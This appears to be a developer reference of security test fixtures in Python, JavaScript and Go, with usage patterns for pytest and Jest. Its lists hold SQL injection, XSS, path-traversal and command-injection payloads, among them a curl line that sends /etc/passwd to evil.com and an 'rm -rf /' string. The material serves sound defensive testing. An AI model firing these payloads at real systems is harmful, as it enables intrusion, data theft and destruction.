# Adversarial Input Patterns

Copy-paste test fixtures for common attack vectors. Use these for any function that accepts external input (API parameters, user messages, file uploads, email content, form data).

---

## SQL Injection Strings

```python
# pytest fixtures
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "1; UPDATE users SET role='admin' WHERE '1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--",
    "admin'--",
    "1' ORDER BY 1--",
    "' OR ''='",
]

@pytest.fixture
def sql_injection_payloads():
    return SQL_INJECTION_PAYLOADS
```

```javascript
// Jest fixtures
const SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "1; UPDATE users SET role='admin' WHERE '1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "admin'--",
    "1' ORDER BY 1--",
    "' OR ''='",
];
```

```go
// Go test fixtures
var sqlInjectionPayloads = []string{
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT * FROM users --",
    "1; UPDATE users SET role='admin' WHERE '1'='1",
    "admin'--",
    "1' ORDER BY 1--",
    "' OR ''='",
}
```

---

## XSS Payloads

```python
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "<iframe src='javascript:alert(1)'>",
    "' onmouseover='alert(1)' '",
    "<body onload=alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "{{constructor.constructor('alert(1)')()}}",  # Template injection
    "${7*7}",  # SSTI
    "<a href=\"javascript:alert('xss')\">click</a>",
]

@pytest.fixture
def xss_payloads():
    return XSS_PAYLOADS
```

```javascript
const XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert('xss')>",
    "javascript:alert('xss')",
    "<iframe src='javascript:alert(1)'>",
    "' onmouseover='alert(1)' '",
    "{{constructor.constructor('alert(1)')()}}",
    "${7*7}",
];
```

---

## Path Traversal

```python
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00.jpg",  # Null byte + extension
    "....\\....\\windows\\win.ini",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",  # UTF-8 overlong
    "file:///etc/passwd",
]

@pytest.fixture
def path_traversal_payloads():
    return PATH_TRAVERSAL_PAYLOADS
```

```javascript
const PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\system32\\config\\sam",
    "../../../etc/shadow",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00.jpg",
    "file:///etc/passwd",
];
```

---

## Oversized Inputs

```python
OVERSIZED_PAYLOADS = [
    "A" * 1_000_000,         # 1 MB string
    "A" * 10_000_000,        # 10 MB string
    "x" * 65536,             # Max URL length
    "\n" * 100_000,          # 100K newlines
    "a=b&" * 100_000,        # 100K query params
    '{"a":' * 10_000 + '"x"' + '}' * 10_000,  # Deeply nested JSON
]

@pytest.fixture
def oversized_payloads():
    return OVERSIZED_PAYLOADS
```

```javascript
const OVERSIZED_PAYLOADS = [
    "A".repeat(1_000_000),
    "A".repeat(10_000_000),
    "x".repeat(65536),
    "\n".repeat(100_000),
    "a=b&".repeat(100_000),
];
```

---

## Null Bytes and Special Characters

```python
NULL_BYTE_PAYLOADS = [
    "file.txt\x00.exe",      # Null byte truncation
    "normal\x00malicious",
    "\x00",                   # Just null
    "test\r\nHeader: injected",  # CRLF injection
    "test\nX-Injected: true",   # Header injection
    "\xff\xfe",               # BOM characters
    "\ud800",                 # Unpaired surrogate (invalid UTF-16)
]

UNICODE_EXPLOIT_PAYLOADS = [
    "\u200b",                 # Zero-width space
    "\u200c",                 # Zero-width non-joiner
    "\u200d",                 # Zero-width joiner
    "\u2028",                 # Line separator
    "\u2029",                 # Paragraph separator
    "\ufeff",                 # Zero-width no-break space (BOM)
    "\u202e" + "fdp.exe",    # Right-to-left override (shows as exe.pdf)
    "A\u0300",                # Combining character
    "\U000e0041",             # Unicode tag character
]

@pytest.fixture
def null_byte_payloads():
    return NULL_BYTE_PAYLOADS

@pytest.fixture
def unicode_exploit_payloads():
    return UNICODE_EXPLOIT_PAYLOADS
```

---

## Empty and Missing Inputs

```python
EMPTY_PAYLOADS = [
    "",                       # Empty string
    None,                     # Null
    "   ",                    # Whitespace only
    "\t\n\r",                 # Only control characters
    [],                       # Empty list
    {},                       # Empty dict
    0,                        # Zero
    False,                    # Boolean false
    float('nan'),             # NaN
    float('inf'),             # Infinity
    float('-inf'),            # Negative infinity
]

@pytest.fixture
def empty_payloads():
    return EMPTY_PAYLOADS
```

---

## Command Injection

```python
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "&& rm -rf /",
    "|| echo pwned",
    "\nid",
    "; curl http://evil.com/exfil?data=$(cat /etc/passwd)",
    "$(sleep 10)",            # Time-based detection
]

@pytest.fixture
def command_injection_payloads():
    return COMMAND_INJECTION_PAYLOADS
```

---

## Usage Pattern

```python
import pytest

class TestUserInputHandler:
    """Test that user input is properly sanitized."""

    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_rejects_sql_injection(self, payload):
        """SQL injection strings must not cause query manipulation."""
        result = process_user_input(payload)
        # Should either sanitize or reject — never execute
        assert "DROP" not in str(result)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_sanitizes_xss(self, payload):
        """XSS payloads must be escaped or stripped."""
        result = render_user_content(payload)
        assert "<script>" not in result
        assert "javascript:" not in result
        assert "onerror=" not in result

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_blocks_path_traversal(self, payload):
        """Path traversal attempts must be blocked."""
        with pytest.raises((ValueError, PermissionError)):
            resolve_file_path(payload)

    @pytest.mark.parametrize("payload", OVERSIZED_PAYLOADS)
    def test_handles_oversized_input(self, payload):
        """Oversized inputs must be rejected, not crash."""
        # Should reject gracefully, not OOM
        result = process_user_input(payload)
        assert result is not None  # Didn't crash

    @pytest.mark.parametrize("payload", NULL_BYTE_PAYLOADS)
    def test_handles_null_bytes(self, payload):
        """Null bytes must be stripped or rejected."""
        result = process_user_input(payload)
        assert "\x00" not in str(result)
```

```javascript
// Jest usage pattern
describe('User input sanitization', () => {
    test.each(SQL_INJECTION_PAYLOADS)(
        'rejects SQL injection: %s',
        (payload) => {
            const result = processUserInput(payload);
            expect(result).not.toContain('DROP');
        }
    );

    test.each(XSS_PAYLOADS)(
        'sanitizes XSS: %s',
        (payload) => {
            const result = renderUserContent(payload);
            expect(result).not.toContain('<script>');
            expect(result).not.toContain('javascript:');
        }
    );

    test.each(PATH_TRAVERSAL_PAYLOADS)(
        'blocks path traversal: %s',
        (payload) => {
            expect(() => resolveFilePath(payload)).toThrow();
        }
    );
});
```
